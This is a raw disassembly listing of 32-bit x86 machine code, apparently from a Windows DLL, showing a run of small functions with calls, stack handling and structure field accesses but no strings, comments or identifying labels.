100078f3:	ff 15 34 e1 00 10    	call   *0x1000e134
100078f9:	8b f8                	mov    %eax,%edi
100078fb:	85 ff                	test   %edi,%edi
100078fd:	74 24                	je     0x10007923
100078ff:	8b 4d 08             	mov    0x8(%ebp),%ecx
10007902:	56                   	push   %esi
10007903:	ff 75 0c             	pushl  0xc(%ebp)
10007906:	47                   	inc    %edi
10007907:	e8 e0 b4 ff ff       	call   0x10002dec
1000790c:	85 c0                	test   %eax,%eax
1000790e:	79 13                	jns    0x10007923
10007910:	8b 4d 08             	mov    0x8(%ebp),%ecx
10007913:	68 0c eb 00 10       	push   $0x1000eb0c
10007918:	ff 75 0c             	pushl  0xc(%ebp)
1000791b:	e8 cc b4 ff ff       	call   0x10002dec
10007920:	6a 0a                	push   $0xa
10007922:	5f                   	pop    %edi
10007923:	8b c7                	mov    %edi,%eax
10007925:	5f                   	pop    %edi
10007926:	5e                   	pop    %esi
10007927:	5d                   	pop    %ebp
10007928:	c2 08 00             	ret    $0x8
1000792b:	55                   	push   %ebp
1000792c:	8b ec                	mov    %esp,%ebp
1000792e:	56                   	push   %esi
1000792f:	57                   	push   %edi
10007930:	8d b0 14 02 00 00    	lea    0x214(%eax),%esi
10007936:	56                   	push   %esi
10007937:	ff 15 34 e1 00 10    	call   *0x1000e134
1000793d:	8b f8                	mov    %eax,%edi
1000793f:	85 ff                	test   %edi,%edi
10007941:	74 24                	je     0x10007967
10007943:	8b 4d 08             	mov    0x8(%ebp),%ecx
10007946:	56                   	push   %esi
10007947:	ff 75 0c             	pushl  0xc(%ebp)
1000794a:	47                   	inc    %edi
1000794b:	e8 9c b4 ff ff       	call   0x10002dec
10007950:	85 c0                	test   %eax,%eax
10007952:	79 13                	jns    0x10007967
10007954:	8b 4d 08             	mov    0x8(%ebp),%ecx
10007957:	68 0c eb 00 10       	push   $0x1000eb0c
1000795c:	ff 75 0c             	pushl  0xc(%ebp)
1000795f:	e8 88 b4 ff ff       	call   0x10002dec
10007964:	6a 0a                	push   $0xa
10007966:	5f                   	pop    %edi
10007967:	8b c7                	mov    %edi,%eax
10007969:	5f                   	pop    %edi
1000796a:	5e                   	pop    %esi
1000796b:	5d                   	pop    %ebp
1000796c:	c2 08 00             	ret    $0x8
1000796f:	55                   	push   %ebp
10007970:	8b ec                	mov    %esp,%ebp
10007972:	56                   	push   %esi
10007973:	57                   	push   %edi
10007974:	8d b8 94 03 00 00    	lea    0x394(%eax),%edi
1000797a:	57                   	push   %edi
1000797b:	ff 15 34 e1 00 10    	call   *0x1000e134
10007981:	8d 70 01             	lea    0x1(%eax),%esi
10007984:	56                   	push   %esi
10007985:	57                   	push   %edi
10007986:	ff 75 08             	pushl  0x8(%ebp)
10007989:	e8 82 63 00 00       	call   0x1000dd10
1000798e:	83 c4 0c             	add    $0xc,%esp
10007991:	5f                   	pop    %edi
10007992:	8b c6                	mov    %esi,%eax
10007994:	5e                   	pop    %esi
10007995:	5d                   	pop    %ebp
10007996:	c2 04 00             	ret    $0x4
10007999:	55                   	push   %ebp
1000799a:	8b ec                	mov    %esp,%ebp
1000799c:	51                   	push   %ecx
1000799d:	57                   	push   %edi
1000799e:	8b c6                	mov    %esi,%eax
100079a0:	33 ff                	xor    %edi,%edi
100079a2:	e8 80 06 00 00       	call   0x10008027
100079a7:	85 c0                	test   %eax,%eax
100079a9:	74 1e                	je     0x100079c9
100079ab:	ff 75 08             	pushl  0x8(%ebp)
100079ae:	8d 86 38 04 00 00    	lea    0x438(%esi),%eax
100079b4:	33 c9                	xor    %ecx,%ecx
100079b6:	50                   	push   %eax
100079b7:	8b 45 0c             	mov    0xc(%ebp),%eax
100079ba:	41                   	inc    %ecx
100079bb:	e8 cb 26 00 00       	call   0x1000a08b
100079c0:	8b f8                	mov    %eax,%edi
100079c2:	8b c6                	mov    %esi,%eax
100079c4:	e8 6e 06 00 00       	call   0x10008037
100079c9:	8b c7                	mov    %edi,%eax
100079cb:	5f                   	pop    %edi
100079cc:	59                   	pop    %ecx
100079cd:	5d                   	pop    %ebp
100079ce:	c2 08 00             	ret    $0x8
100079d1:	55                   	push   %ebp
100079d2:	8b ec                	mov    %esp,%ebp
100079d4:	83 ec 0c             	sub    $0xc,%esp
100079d7:	8b 4d 0c             	mov    0xc(%ebp),%ecx
100079da:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
100079de:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
100079e2:	53                   	push   %ebx
100079e3:	56                   	push   %esi
100079e4:	57                   	push   %edi
100079e5:	8b f8                	mov    %eax,%edi
100079e7:	8d 45 f8             	lea    -0x8(%ebp),%eax
100079ea:	50                   	push   %eax
100079eb:	ff 75 08             	pushl  0x8(%ebp)
100079ee:	8d 45 fc             	lea    -0x4(%ebp),%eax
100079f1:	e8 28 01 00 00       	call   0x10007b1e
100079f6:	8b d8                	mov    %eax,%ebx
100079f8:	85 db                	test   %ebx,%ebx
100079fa:	74 3a                	je     0x10007a36
100079fc:	8b c7                	mov    %edi,%eax
100079fe:	e8 24 06 00 00       	call   0x10008027
10007a03:	85 c0                	test   %eax,%eax
10007a05:	74 1c                	je     0x10007a23
10007a07:	ff 75 fc             	pushl  -0x4(%ebp)
10007a0a:	8d 87 38 04 00 00    	lea    0x438(%edi),%eax
10007a10:	50                   	push   %eax
10007a11:	8b 45 f8             	mov    -0x8(%ebp),%eax
10007a14:	6a 02                	push   $0x2
10007a16:	59                   	pop    %ecx
10007a17:	e8 5a 26 00 00       	call   0x1000a076
10007a1c:	8b c7                	mov    %edi,%eax
10007a1e:	e8 14 06 00 00       	call   0x10008037
10007a23:	ff 75 0c             	pushl  0xc(%ebp)
10007a26:	8b 77 08             	mov    0x8(%edi),%esi
10007a29:	ff 75 08             	pushl  0x8(%ebp)
10007a2c:	68 a0 e6 00 10       	push   $0x1000e6a0
10007a31:	e8 0e 11 00 00       	call   0x10008b44
10007a36:	5f                   	pop    %edi
10007a37:	5e                   	pop    %esi
10007a38:	8b c3                	mov    %ebx,%eax
10007a3a:	5b                   	pop    %ebx
10007a3b:	c9                   	leave  
10007a3c:	c2 08 00             	ret    $0x8
10007a3f:	55                   	push   %ebp
10007a40:	8b ec                	mov    %esp,%ebp
10007a42:	51                   	push   %ecx
10007a43:	57                   	push   %edi
10007a44:	8b c6                	mov    %esi,%eax
10007a46:	33 ff                	xor    %edi,%edi
10007a48:	e8 da 05 00 00       	call   0x10008027
10007a4d:	85 c0                	test   %eax,%eax
10007a4f:	74 1e                	je     0x10007a6f
10007a51:	ff 75 08             	pushl  0x8(%ebp)
10007a54:	8d 86 38 04 00 00    	lea    0x438(%esi),%eax
10007a5a:	50                   	push   %eax
10007a5b:	8b 45 0c             	mov    0xc(%ebp),%eax
10007a5e:	6a 02                	push   $0x2
10007a60:	59                   	pop    %ecx
10007a61:	e8 25 26 00 00       	call   0x1000a08b
10007a66:	8b f8                	mov    %eax,%edi
10007a68:	8b c6                	mov    %esi,%eax
10007a6a:	e8 c8 05 00 00       	call   0x10008037
10007a6f:	8b c7                	mov    %edi,%eax
10007a71:	5f                   	pop    %edi
10007a72:	59                   	pop    %ecx
10007a73:	5d                   	pop    %ebp
10007a74:	c2 08 00             	ret    $0x8
10007a77:	55                   	push   %ebp
10007a78:	8b ec                	mov    %esp,%ebp
10007a7a:	8b 4d 0c             	mov    0xc(%ebp),%ecx
10007a7d:	83 ec 0c             	sub    $0xc,%esp
10007a80:	53                   	push   %ebx
10007a81:	56                   	push   %esi
10007a82:	57                   	push   %edi
10007a83:	8b f8                	mov    %eax,%edi
10007a85:	8d 45 f8             	lea    -0x8(%ebp),%eax
10007a88:	50                   	push   %eax
10007a89:	ff 75 08             	pushl  0x8(%ebp)
10007a8c:	8d 45 fc             	lea    -0x4(%ebp),%eax
10007a8f:	8b f7                	mov    %edi,%esi
10007a91:	33 db                	xor    %ebx,%ebx
10007a93:	e8 fc 00 00 00       	call   0x10007b94
10007a98:	85 c0                	test   %eax,%eax
10007a9a:	74 2d                	je     0x10007ac9
10007a9c:	8b 45 fc             	mov    -0x4(%ebp),%eax
10007a9f:	e8 ea 0a 00 00       	call   0x1000858e
10007aa4:	3b 87 1c 04 00 00    	cmp    0x41c(%edi),%eax
10007aaa:	76 10                	jbe    0x10007abc
10007aac:	ff 75 0c             	pushl  0xc(%ebp)
10007aaf:	8b 77 08             	mov    0x8(%edi),%esi
10007ab2:	ff 75 08             	pushl  0x8(%ebp)
10007ab5:	e8 ec 0f 00 00       	call   0x10008aa6
10007aba:	8b d8                	mov    %eax,%ebx
10007abc:	ff 75 fc             	pushl  -0x4(%ebp)
10007abf:	e8 4f ef ff ff       	call   0x10006a13
10007ac4:	59                   	pop    %ecx
10007ac5:	85 db                	test   %ebx,%ebx
10007ac7:	75 43                	jne    0x10007b0c
10007ac9:	8b 4d 0c             	mov    0xc(%ebp),%ecx
10007acc:	8d 45 f8             	lea    -0x8(%ebp),%eax
10007acf:	50                   	push   %eax
10007ad0:	ff 75 08             	pushl  0x8(%ebp)
10007ad3:	8d 45 fc             	lea    -0x4(%ebp),%eax
10007ad6:	e8 43 00 00 00       	call   0x10007b1e
10007adb:	85 c0                	test   %eax,%eax
10007add:	74 36                	je     0x10007b15
10007adf:	8b 45 fc             	mov    -0x4(%ebp),%eax
10007ae2:	e8 a7 0a 00 00       	call   0x1000858e
10007ae7:	3b 87 1c 04 00 00    	cmp    0x41c(%edi),%eax
10007aed:	76 10                	jbe    0x10007aff
10007aef:	ff 75 0c             	pushl  0xc(%ebp)
10007af2:	8b 77 08             	mov    0x8(%edi),%esi
10007af5:	ff 75 08             	pushl  0x8(%ebp)
10007af8:	e8 a9 0f 00 00       	call   0x10008aa6
10007afd:	8b d8                	mov    %eax,%ebx
10007aff:	ff 75 fc             	pushl  -0x4(%ebp)
10007b02:	e8 0c ef ff ff       	call   0x10006a13
10007b07:	59                   	pop    %ecx
10007b08:	85 db                	test   %ebx,%ebx
10007b0a:	74 09                	je     0x10007b15
10007b0c:	8b c7                	mov    %edi,%eax
10007b0e:	e8 a7 01 00 00       	call   0x10007cba
10007b13:	8b d8                	mov    %eax,%ebx
10007b15:	5f                   	pop    %edi
10007b16:	5e                   	pop    %esi
10007b17:	8b c3                	mov    %ebx,%eax
10007b19:	5b                   	pop    %ebx
10007b1a:	c9                   	leave  
10007b1b:	c2 08 00             	ret    $0x8
10007b1e:	55                   	push   %ebp
10007b1f:	8b ec                	mov    %esp,%ebp
10007b21:	53                   	push   %ebx
10007b22:	56                   	push   %esi
10007b23:	8b d9                	mov    %ecx,%ebx
10007b25:	53                   	push   %ebx
10007b26:	8b f0                	mov    %eax,%esi
10007b28:	e8 b7 ee ff ff       	call   0x100069e4
10007b2d:	59                   	pop    %ecx
10007b2e:	89 06                	mov    %eax,(%esi)
10007b30:	85 c0                	test   %eax,%eax
10007b32:	75 04                	jne    0x10007b38
10007b34:	33 c0                	xor    %eax,%eax
10007b36:	eb 56                	jmp    0x10007b8e
10007b38:	53                   	push   %ebx
10007b39:	50                   	push   %eax
10007b3a:	ff 75 08             	pushl  0x8(%ebp)
10007b3d:	e8 61 e2 ff ff       	call   0x10005da3
10007b42:	8b 5d 0c             	mov    0xc(%ebp),%ebx
10007b45:	83 c4 0c             	add    $0xc,%esp
10007b48:	89 03                	mov    %eax,(%ebx)
10007b4a:	85 c0                	test   %eax,%eax
10007b4c:	75 0d                	jne    0x10007b5b
10007b4e:	ff 36                	pushl  (%esi)
10007b50:	e8 be ee ff ff       	call   0x10006a13
10007b55:	83 26 00             	andl   $0x0,(%esi)
10007b58:	59                   	pop    %ecx
10007b59:	eb d9                	jmp    0x10007b34
10007b5b:	50                   	push   %eax
10007b5c:	ff 36                	pushl  (%esi)
10007b5e:	e8 e1 04 00 00       	call   0x10008044
10007b63:	85 c0                	test   %eax,%eax
10007b65:	75 10                	jne    0x10007b77
10007b67:	ff 36                	pushl  (%esi)
10007b69:	e8 a5 ee ff ff       	call   0x10006a13
10007b6e:	83 26 00             	andl   $0x0,(%esi)
10007b71:	83 23 00             	andl   $0x0,(%ebx)
10007b74:	59                   	pop    %ecx
10007b75:	eb bd                	jmp    0x10007b34
10007b77:	8b 36                	mov    (%esi),%esi
10007b79:	8b 06                	mov    (%esi),%eax
10007b7b:	50                   	push   %eax
10007b7c:	89 03                	mov    %eax,(%ebx)
10007b7e:	8d 46 04             	lea    0x4(%esi),%eax
10007b81:	50                   	push   %eax
10007b82:	56                   	push   %esi
10007b83:	e8 88 61 00 00       	call   0x1000dd10
10007b88:	33 c0                	xor    %eax,%eax
10007b8a:	83 c4 0c             	add    $0xc,%esp
10007b8d:	40                   	inc    %eax
10007b8e:	5e                   	pop    %esi
10007b8f:	5b                   	pop    %ebx
10007b90:	5d                   	pop    %ebp
10007b91:	c2 08 00             	ret    $0x8
10007b94:	55                   	push   %ebp
10007b95:	8b ec                	mov    %esp,%ebp
10007b97:	53                   	push   %ebx
10007b98:	57                   	push   %edi
10007b99:	8b d9                	mov    %ecx,%ebx
10007b9b:	53                   	push   %ebx
10007b9c:	8b f8                	mov    %eax,%edi
10007b9e:	e8 41 ee ff ff       	call   0x100069e4
10007ba3:	59                   	pop    %ecx
10007ba4:	89 07                	mov    %eax,(%edi)
10007ba6:	85 c0                	test   %eax,%eax
10007ba8:	75 04                	jne    0x10007bae
10007baa:	33 c0                	xor    %eax,%eax
10007bac:	eb 56                	jmp    0x10007c04
10007bae:	53                   	push   %ebx
10007baf:	50                   	push   %eax
10007bb0:	ff 75 08             	pushl  0x8(%ebp)
10007bb3:	e8 eb e1 ff ff       	call   0x10005da3
10007bb8:	8b 5d 0c             	mov    0xc(%ebp),%ebx
10007bbb:	83 c4 0c             	add    $0xc,%esp
10007bbe:	89 03                	mov    %eax,(%ebx)
10007bc0:	85 c0                	test   %eax,%eax
10007bc2:	75 0d                	jne    0x10007bd1
10007bc4:	ff 37                	pushl  (%edi)
10007bc6:	e8 48 ee ff ff       	call   0x10006a13
10007bcb:	83 27 00             	andl   $0x0,(%edi)
10007bce:	59                   	pop    %ecx
10007bcf:	eb d9                	jmp    0x10007baa
10007bd1:	50                   	push   %eax
10007bd2:	ff 37                	pushl  (%edi)
10007bd4:	e8 e6 04 00 00       	call   0x100080bf
10007bd9:	85 c0                	test   %eax,%eax
10007bdb:	75 10                	jne    0x10007bed
10007bdd:	ff 37                	pushl  (%edi)
10007bdf:	e8 2f ee ff ff       	call   0x10006a13
10007be4:	83 27 00             	andl   $0x0,(%edi)
10007be7:	83 23 00             	andl   $0x0,(%ebx)
10007bea:	59                   	pop    %ecx
10007beb:	eb bd                	jmp    0x10007baa
10007bed:	8b 3f                	mov    (%edi),%edi
10007bef:	8b 07                	mov    (%edi),%eax
10007bf1:	50                   	push   %eax
10007bf2:	89 03                	mov    %eax,(%ebx)
10007bf4:	8d 47 04             	lea    0x4(%edi),%eax
10007bf7:	50                   	push   %eax
10007bf8:	57                   	push   %edi
10007bf9:	e8 12 61 00 00       	call   0x1000dd10
10007bfe:	33 c0                	xor    %eax,%eax
10007c00:	83 c4 0c             	add    $0xc,%esp
10007c03:	40                   	inc    %eax
10007c04:	5f                   	pop    %edi
10007c05:	5b                   	pop    %ebx
10007c06:	5d                   	pop    %ebp
10007c07:	c2 08 00             	ret    $0x8
10007c0a:	55                   	push   %ebp
10007c0b:	8b ec                	mov    %esp,%ebp
10007c0d:	57                   	push   %edi
10007c0e:	8b c6                	mov    %esi,%eax
10007c10:	33 ff                	xor    %edi,%edi
10007c12:	e8 10 04 00 00       	call   0x10008027
10007c17:	85 c0                	test   %eax,%eax
10007c19:	74 1f                	je     0x10007c3a
10007c1b:	ff 75 08             	pushl  0x8(%ebp)
10007c1e:	8d 86 38 04 00 00    	lea    0x438(%esi),%eax
10007c24:	50                   	push   %eax
10007c25:	b8 00 e0 00 00       	mov    $0xe000,%eax
10007c2a:	33 c9                	xor    %ecx,%ecx
10007c2c:	e8 5a 24 00 00       	call   0x1000a08b
10007c31:	8b f8                	mov    %eax,%edi
10007c33:	8b c6                	mov    %esi,%eax
10007c35:	e8 fd 03 00 00       	call   0x10008037
10007c3a:	8b c7                	mov    %edi,%eax
10007c3c:	5f                   	pop    %edi
10007c3d:	5d                   	pop    %ebp
10007c3e:	c2 04 00             	ret    $0x4
10007c41:	68 50 0a 00 00       	push   $0xa50
10007c46:	e8 99 ed ff ff       	call   0x100069e4
10007c4b:	59                   	pop    %ecx
10007c4c:	c3                   	ret    
10007c4d:	55                   	push   %ebp
10007c4e:	8b ec                	mov    %esp,%ebp
10007c50:	5d                   	pop    %ebp
10007c51:	e9 bd ed ff ff       	jmp    0x10006a13
10007c56:	55                   	push   %ebp
10007c57:	8b ec                	mov    %esp,%ebp
10007c59:	51                   	push   %ecx
10007c5a:	57                   	push   %edi
10007c5b:	8d be 38 04 00 00    	lea    0x438(%esi),%edi
10007c61:	57                   	push   %edi
10007c62:	e8 50 22 00 00       	call   0x10009eb7
10007c67:	8b 45 08             	mov    0x8(%ebp),%eax
10007c6a:	ff 75 14             	pushl  0x14(%ebp)
10007c6d:	83 66 10 00          	andl   $0x0,0x10(%esi)
10007c71:	83 a6 1c 06 00 00 00 	andl   $0x0,0x61c(%esi)
10007c78:	89 46 04             	mov    %eax,0x4(%esi)
10007c7b:	8b 45 0c             	mov    0xc(%ebp),%eax
10007c7e:	89 46 08             	mov    %eax,0x8(%esi)
10007c81:	8b 45 10             	mov    0x10(%ebp),%eax
10007c84:	89 46 0c             	mov    %eax,0xc(%esi)
10007c87:	8b 45 1c             	mov    0x1c(%ebp),%eax
10007c8a:	57                   	push   %edi
10007c8b:	6a 03                	push   $0x3
10007c8d:	89 86 18 06 00 00    	mov    %eax,0x618(%esi)
10007c93:	8b 45 18             	mov    0x18(%ebp),%eax
10007c96:	59                   	pop    %ecx
10007c97:	e8 da 23 00 00       	call   0x1000a076
10007c9c:	8d 86 20 04 00 00    	lea    0x420(%esi),%eax
10007ca2:	50                   	push   %eax
10007ca3:	ff 15 5c e1 00 10    	call   *0x1000e15c
10007ca9:	8b c6                	mov    %esi,%eax
10007cab:	e8 9f 02 00 00       	call   0x10007f4f
10007cb0:	89 06                	mov    %eax,(%esi)
10007cb2:	8b c6                	mov    %esi,%eax
10007cb4:	5f                   	pop    %edi
10007cb5:	59                   	pop    %ecx
10007cb6:	5d                   	pop    %ebp
10007cb7:	c2 18 00             	ret    $0x18
10007cba:	55                   	push   %ebp
10007cbb:	8b ec                	mov    %esp,%ebp
10007cbd:	83 ec 14             	sub    $0x14,%esp
10007cc0:	53                   	push   %ebx
10007cc1:	56                   	push   %esi
10007cc2:	57                   	push   %edi
10007cc3:	33 db                	xor    %ebx,%ebx
10007cc5:	8b f8                	mov    %eax,%edi
10007cc7:	89 5d f8             	mov    %ebx,-0x8(%ebp)
10007cca:	e8 58 03 00 00       	call   0x10008027
10007ccf:	85 c0                	test   %eax,%eax
10007cd1:	0f 84 fc 00 00 00    	je     0x10007dd3
10007cd7:	8d b7 14 04 00 00    	lea    0x414(%edi),%esi
10007cdd:	8b 06                	mov    (%esi),%eax
10007cdf:	89 75 f0             	mov    %esi,-0x10(%ebp)
10007ce2:	3b c3                	cmp    %ebx,%eax
10007ce4:	74 0f                	je     0x10007cf5
10007ce6:	50                   	push   %eax
10007ce7:	e8 27 ed ff ff       	call   0x10006a13
10007cec:	59                   	pop    %ecx
10007ced:	89 1e                	mov    %ebx,(%esi)
10007cef:	89 9f 18 04 00 00    	mov    %ebx,0x418(%edi)
10007cf5:	8b 47 08             	mov    0x8(%edi),%eax
10007cf8:	89 9f 1c 04 00 00    	mov    %ebx,0x41c(%edi)
10007cfe:	8d 9f 18 04 00 00    	lea    0x418(%edi),%ebx
10007d04:	56                   	push   %esi
10007d05:	e8 5f 0d 00 00       	call   0x10008a69
10007d0a:	85 c0                	test   %eax,%eax
10007d0c:	75 10                	jne    0x10007d1e
10007d0e:	e8 2d f4 ff ff       	call   0x10007140
10007d13:	89 45 f8             	mov    %eax,-0x8(%ebp)
10007d16:	85 c0                	test   %eax,%eax
10007d18:	0f 84 ae 00 00 00    	je     0x10007dcc
10007d1e:	8b 0b                	mov    (%ebx),%ecx
10007d20:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
10007d24:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10007d28:	8d 45 fc             	lea    -0x4(%ebp),%eax
10007d2b:	50                   	push   %eax
10007d2c:	ff 36                	pushl  (%esi)
10007d2e:	8d 45 f4             	lea    -0xc(%ebp),%eax
10007d31:	8b f7                	mov    %edi,%esi
10007d33:	e8 5c fe ff ff       	call   0x10007b94
10007d38:	89 45 f8             	mov    %eax,-0x8(%ebp)
10007d3b:	85 c0                	test   %eax,%eax
10007d3d:	75 56                	jne    0x10007d95
10007d3f:	8b 75 f0             	mov    -0x10(%ebp),%esi
10007d42:	8b 0b                	mov    (%ebx),%ecx
10007d44:	8d 45 fc             	lea    -0x4(%ebp),%eax
10007d47:	50                   	push   %eax
10007d48:	ff 36                	pushl  (%esi)
10007d4a:	8d 45 f4             	lea    -0xc(%ebp),%eax
10007d4d:	e8 cc fd ff ff       	call   0x10007b1e
10007d52:	89 45 f8             	mov    %eax,-0x8(%ebp)
10007d55:	85 c0                	test   %eax,%eax
10007d57:	75 3c                	jne    0x10007d95
10007d59:	e8 e2 f3 ff ff       	call   0x10007140
10007d5e:	85 c0                	test   %eax,%eax
10007d60:	74 6a                	je     0x10007dcc
10007d62:	8b 0b                	mov    (%ebx),%ecx
10007d64:	8d 45 fc             	lea    -0x4(%ebp),%eax
10007d67:	50                   	push   %eax
10007d68:	ff 36                	pushl  (%esi)
10007d6a:	8d 45 f4             	lea    -0xc(%ebp),%eax
10007d6d:	8b f7                	mov    %edi,%esi
10007d6f:	e8 20 fe ff ff       	call   0x10007b94
10007d74:	89 45 f8             	mov    %eax,-0x8(%ebp)
10007d77:	85 c0                	test   %eax,%eax
10007d79:	75 1a                	jne    0x10007d95
10007d7b:	8b 0b                	mov    (%ebx),%ecx
10007d7d:	8d 45 fc             	lea    -0x4(%ebp),%eax
10007d80:	50                   	push   %eax
10007d81:	8b 45 f0             	mov    -0x10(%ebp),%eax
10007d84:	ff 30                	pushl  (%eax)
10007d86:	8d 45 f4             	lea    -0xc(%ebp),%eax
10007d89:	e8 90 fd ff ff       	call   0x10007b1e
10007d8e:	89 45 f8             	mov    %eax,-0x8(%ebp)
10007d91:	85 c0                	test   %eax,%eax
10007d93:	74 37                	je     0x10007dcc
10007d95:	8b 75 f4             	mov    -0xc(%ebp),%esi
10007d98:	56                   	push   %esi
10007d99:	8d 87 38 04 00 00    	lea    0x438(%edi),%eax
10007d9f:	50                   	push   %eax
10007da0:	8b 45 fc             	mov    -0x4(%ebp),%eax
10007da3:	33 c9                	xor    %ecx,%ecx
10007da5:	e8 cc 22 00 00       	call   0x1000a076
10007daa:	8b c6                	mov    %esi,%eax
10007dac:	e8 dd 07 00 00       	call   0x1000858e
10007db1:	ff 75 fc             	pushl  -0x4(%ebp)
10007db4:	89 87 1c 04 00 00    	mov    %eax,0x41c(%edi)
10007dba:	6a 00                	push   $0x0
10007dbc:	56                   	push   %esi
10007dbd:	e8 68 5f 00 00       	call   0x1000dd2a
10007dc2:	83 c4 0c             	add    $0xc,%esp
10007dc5:	56                   	push   %esi
10007dc6:	e8 48 ec ff ff       	call   0x10006a13
10007dcb:	59                   	pop    %ecx
10007dcc:	8b c7                	mov    %edi,%eax
10007dce:	e8 64 02 00 00       	call   0x10008037
10007dd3:	8b 45 f8             	mov    -0x8(%ebp),%eax
10007dd6:	5f                   	pop    %edi
10007dd7:	5e                   	pop    %esi
10007dd8:	5b                   	pop    %ebx
10007dd9:	c9                   	leave  
10007dda:	c3                   	ret    
10007ddb:	55                   	push   %ebp
10007ddc:	8b ec                	mov    %esp,%ebp
10007dde:	83 ec 10             	sub    $0x10,%esp
10007de1:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10007de5:	53                   	push   %ebx
10007de6:	56                   	push   %esi
10007de7:	8b c7                	mov    %edi,%eax
10007de9:	e8 39 02 00 00       	call   0x10008027
10007dee:	85 c0                	test   %eax,%eax
10007df0:	0f 84 98 00 00 00    	je     0x10007e8e
10007df6:	be 00 e0 00 00       	mov    $0xe000,%esi
10007dfb:	56                   	push   %esi
10007dfc:	e8 e3 eb ff ff       	call   0x100069e4
10007e01:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
10007e05:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
10007e09:	8b d8                	mov    %eax,%ebx
10007e0b:	59                   	pop    %ecx
10007e0c:	85 db                	test   %ebx,%ebx
10007e0e:	74 34                	je     0x10007e44
10007e10:	56                   	push   %esi
10007e11:	8b 77 08             	mov    0x8(%edi),%esi
10007e14:	53                   	push   %ebx
10007e15:	68 04 eb 00 10       	push   $0x1000eb04
10007e1a:	e8 fb 0d 00 00       	call   0x10008c1a
10007e1f:	8b c8                	mov    %eax,%ecx
10007e21:	85 c9                	test   %ecx,%ecx
10007e23:	74 12                	je     0x10007e37
10007e25:	8d 45 f4             	lea    -0xc(%ebp),%eax
10007e28:	50                   	push   %eax
10007e29:	53                   	push   %ebx
10007e2a:	8d 45 f8             	lea    -0x8(%ebp),%eax
10007e2d:	8b f7                	mov    %edi,%esi
10007e2f:	e8 60 fd ff ff       	call   0x10007b94
10007e34:	89 45 fc             	mov    %eax,-0x4(%ebp)
10007e37:	53                   	push   %ebx
10007e38:	e8 d6 eb ff ff       	call   0x10006a13
10007e3d:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
10007e41:	59                   	pop    %ecx
10007e42:	75 22                	jne    0x10007e66
10007e44:	be 18 eb 00 10       	mov    $0x1000eb18,%esi
10007e49:	56                   	push   %esi
10007e4a:	ff 15 34 e1 00 10    	call   *0x1000e134
10007e50:	56                   	push   %esi
10007e51:	8d 8f 38 04 00 00    	lea    0x438(%edi),%ecx
10007e57:	51                   	push   %ecx
10007e58:	33 c9                	xor    %ecx,%ecx
10007e5a:	40                   	inc    %eax
10007e5b:	41                   	inc    %ecx
10007e5c:	e8 15 22 00 00       	call   0x1000a076
10007e61:	89 45 fc             	mov    %eax,-0x4(%ebp)
10007e64:	eb 21                	jmp    0x10007e87
10007e66:	ff 75 f8             	pushl  -0x8(%ebp)
10007e69:	8d 87 38 04 00 00    	lea    0x438(%edi),%eax
10007e6f:	33 c9                	xor    %ecx,%ecx
10007e71:	50                   	push   %eax
10007e72:	8b 45 f4             	mov    -0xc(%ebp),%eax
10007e75:	41                   	inc    %ecx
10007e76:	e8 fb 21 00 00       	call   0x1000a076
10007e7b:	ff 75 f8             	pushl  -0x8(%ebp)
10007e7e:	89 45 fc             	mov    %eax,-0x4(%ebp)
10007e81:	e8 8d eb ff ff       	call   0x10006a13
10007e86:	59                   	pop    %ecx
10007e87:	8b c7                	mov    %edi,%eax
10007e89:	e8 a9 01 00 00       	call   0x10008037
10007e8e:	8b 45 fc             	mov    -0x4(%ebp),%eax
10007e91:	5e                   	pop    %esi
10007e92:	5b                   	pop    %ebx
10007e93:	c9                   	leave  
10007e94:	c3                   	ret    
10007e95:	55                   	push   %ebp
10007e96:	8b ec                	mov    %esp,%ebp
10007e98:	83 ec 0c             	sub    $0xc,%esp
10007e9b:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10007e9f:	53                   	push   %ebx
10007ea0:	56                   	push   %esi
10007ea1:	57                   	push   %edi
10007ea2:	8b f8                	mov    %eax,%edi
10007ea4:	e8 7e 01 00 00       	call   0x10008027
10007ea9:	85 c0                	test   %eax,%eax
10007eab:	0f 84 96 00 00 00    	je     0x10007f47
10007eb1:	be 00 e0 00 00       	mov    $0xe000,%esi
10007eb6:	56                   	push   %esi
10007eb7:	e8 28 eb ff ff       	call   0x100069e4
10007ebc:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
10007ec0:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
10007ec4:	8b d8                	mov    %eax,%ebx
10007ec6:	59                   	pop    %ecx
10007ec7:	85 db                	test   %ebx,%ebx
10007ec9:	74 32                	je     0x10007efd
10007ecb:	56                   	push   %esi
10007ecc:	8b 77 08             	mov    0x8(%edi),%esi
10007ecf:	53                   	push   %ebx
10007ed0:	68 a0 e6 00 10       	push   $0x1000e6a0
10007ed5:	e8 40 0d 00 00       	call   0x10008c1a
10007eda:	8b c8                	mov    %eax,%ecx
10007edc:	85 c9                	test   %ecx,%ecx
10007ede:	74 10                	je     0x10007ef0
10007ee0:	8d 45 f4             	lea    -0xc(%ebp),%eax
10007ee3:	50                   	push   %eax
10007ee4:	53                   	push   %ebx
10007ee5:	8d 45 f8             	lea    -0x8(%ebp),%eax
10007ee8:	e8 31 fc ff ff       	call   0x10007b1e
10007eed:	89 45 fc             	mov    %eax,-0x4(%ebp)
10007ef0:	53                   	push   %ebx
10007ef1:	e8 1d eb ff ff       	call   0x10006a13
10007ef6:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
10007efa:	59                   	pop    %ecx
10007efb:	75 22                	jne    0x10007f1f
10007efd:	be 18 eb 00 10       	mov    $0x1000eb18,%esi
10007f02:	56                   	push   %esi
10007f03:	ff 15 34 e1 00 10    	call   *0x1000e134
10007f09:	56                   	push   %esi
10007f0a:	8d 8f 38 04 00 00    	lea    0x438(%edi),%ecx
10007f10:	51                   	push   %ecx
10007f11:	6a 02                	push   $0x2
10007f13:	40                   	inc    %eax
10007f14:	59                   	pop    %ecx
10007f15:	e8 5c 21 00 00       	call   0x1000a076
10007f1a:	89 45 fc             	mov    %eax,-0x4(%ebp)
10007f1d:	eb 21                	jmp    0x10007f40
10007f1f:	ff 75 f8             	pushl  -0x8(%ebp)
